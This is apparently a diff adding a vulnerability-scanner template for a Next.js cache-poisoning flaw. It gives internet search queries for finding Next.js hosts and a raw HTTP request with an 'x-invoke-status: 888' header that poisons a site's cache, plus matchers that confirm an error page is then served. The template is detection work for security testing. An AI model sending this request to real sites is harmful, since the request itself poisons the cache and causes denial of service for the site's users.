@@ -1,0 +1,45 @@
+id: next-js-cache-poisoning
+
+info:
+  name: Next.js Cache Poisoning
+  author: Ice3man543
+  severity: high
+  description: |
+    Next.js is vulnerable to cache poisoning through the x-middleware-prefetch and x-invoke-status headers. This can result in DoS by serving an empty JSON object or error page instead of the intended content, affecting SSR responses.
+  reference:
+    - https://github.com/vercel/next.js/compare/v13.4.20-canary.12...v13.4.20-canary.13
+    - https://github.com/valentin-panov/nextjs-no-cache-issue
+    - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cache-poisoning-a-quest-for-the-black-hole
+  metadata:
+    vendor: vercel
+    product: next.js
+    framework: node.js
+    shodan-query:
+      - http.html:"/_next/static"
+      - cpe:"cpe:2.3:a:zeit:next.js"
+    fofa-query: body="/_next/static"
+    zoomeye-query: app="Next.js"
+  tags: cve,cve2023,next-js,cache
+
+variables:
+  rand: "{{rand_text_numeric(5)}}"
+
+http:
+  - raw:
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+        Priority: u=1
+        x-invoke-status: 888
+
+      - |
+        GET /?cb={{rand}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 888 && contains(body_1, '/_error') && !contains(cache_control_1, 'no-cache') && !contains(pragma_1, 'no-cache')"
+          - "status_code_2 == 888 && contains(body_2, '/_error') && !contains(cache_control_2, 'no-cache') && !contains(pragma_2, 'no-cache')"
+        condition: and
+# digest: 490a00463044022005a80dbf5400675d4fba5e462ef341faea74716b461c7ea0131fed04847a0f0102205225d047a9b583acbcc1c765ce856576f81ddd46fec900ec2951d36e334be293:922c64590222798bb761d5b6d8e72950
